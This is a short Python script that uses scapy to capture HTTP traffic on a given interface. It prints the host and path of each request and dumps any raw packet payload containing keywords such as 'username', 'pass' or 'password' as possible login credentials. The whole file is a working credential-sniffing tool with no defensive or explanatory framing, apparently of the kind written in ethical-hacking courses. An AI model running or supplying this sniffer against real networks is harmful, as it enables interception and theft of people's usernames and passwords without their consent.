#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


class Sniffer:
    def __init__(self, interface):
     scapy.sniff(iface=interface, store=False, prn=self.process_sniffed_packet)

    def get_url(self, packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_login_info(self, packet):
     if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "usr", "password", "passcode", "pass"]
        for keyword in keywords:
            if keyword in str(load):
               return load

    def process_sniffed_packet(self, packet):
        if packet.haslayer(http.HTTPRequest):
          url = self.get_url(packet)
          print("[+] HTTP Request >>" + str(url))
        login_info = self.get_login_info(packet)

        if login_info:
            print("\n\n[+] Possible username/password >>" + str(login_info) +"\n\n")